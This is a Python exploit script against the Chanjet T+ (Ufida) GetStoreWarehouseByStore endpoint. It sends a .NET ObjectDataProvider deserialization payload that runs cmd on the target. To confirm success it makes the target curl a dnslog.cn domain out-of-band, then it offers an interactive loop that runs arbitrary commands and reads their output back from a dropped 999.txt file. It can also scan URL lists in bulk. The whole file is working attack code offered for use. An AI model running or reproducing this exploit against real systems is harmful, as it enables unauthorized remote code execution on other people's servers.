import requests
import urllib3
import re,string,random
from urllib.parse import urljoin
import argparse
import time
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def read_file(file_path):
    with open(file_path, 'r') as file:
        urls = file.read().splitlines()
    return urls

def check(url):
    url = url.rstrip("/")
    taeget_url = urljoin(url, "/tplus/ajaxpro/Ufida.T.DI.UIP.RRA.RRATableController,Ufida.T.DI.UIP.ashx?method=GetStoreWarehouseByStore")
    try:
        headers = {
            "User-Agent": "Mozilla/2.0 (compatible; MSIE 3.01; Windows 95",
            "Content-Type": "application/json"
        }
        getdomain = requests.get(url='http://dnslog.cn/getdomain.php', headers={"Cookie": "PHPSESSID=hb0p9iqh804esb5khaulm8ptp2"}, timeout=30)
        domain = str(getdomain.text)
        data="""{
  "storeID":{
    "__type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
    "MethodName":"Start",
    "ObjectInstance":{
        "__type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
        "StartInfo": {
            "__type":"System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
            "FileName":"cmd", "Arguments":"/c curl gyugyu.%s"
       }
    }
  }
}"""%(domain)
        requests.post(taeget_url, verify=False, headers=headers, data=data, timeout=15)
        for i in range(0, 3):
            refresh = requests.get(url='http://dnslog.cn/getrecords.php', headers={"Cookie": "PHPSESSID=hb0p9iqh804esb5khaulm8ptp2"}, timeout=30)
            time.sleep(1)
            if domain in refresh.text:
                print(f"\033[31mDiscovered:{url}: ChangJieTongT+_GetStoreWarehouseByStore_RCE!\033[0m")
                return True
    except Exception as e:
        pass

def run(url):
    url = url.rstrip("/")
    target = urljoin(url, "/tplus/ajaxpro/Ufida.T.DI.UIP.RRA.RRATableController,Ufida.T.DI.UIP.ashx?method=GetStoreWarehouseByStore")
    headers = {
        "User-Agent": "Mozilla/2.0 (compatible; MSIE 3.01; Windows 95",
        "Content-Type": "application/json"
    }
    if check(url):
        while True:
            command = input("\033[34mPlease input command (stop input:exit):\033[0m")
            if "exit" not in command:
                data="""{
  "storeID":{
    "__type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
    "MethodName":"Start",
    "ObjectInstance":{
        "__type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
        "StartInfo": {
            "__type":"System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
            "FileName":"cmd", "Arguments":"/c %s > 999.txt"
       }
    }
  }
}"""%(command)
                try:
                    response = requests.post(target, verify=False, headers=headers, data=data, timeout=15)
                    if response.status_code == 200 and 'dataSource' in response.text:
                        response = requests.get(urljoin(url,'/tplus/999.txt'), verify=False, headers=headers, timeout=15)
                        if response.status_code == 200 and response.text:
                            print(response.text)
                except Exception as e:
                    pass
            else:
                break


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help="URL")
    parser.add_argument("-f", "--txt", help="file")
    args = parser.parse_args()
    url = args.url
    txt = args.txt
    if url:
        run(url)
    elif txt:
        urls = read_file(txt)
        for url in urls:
            check(url)
    else:
        print("help")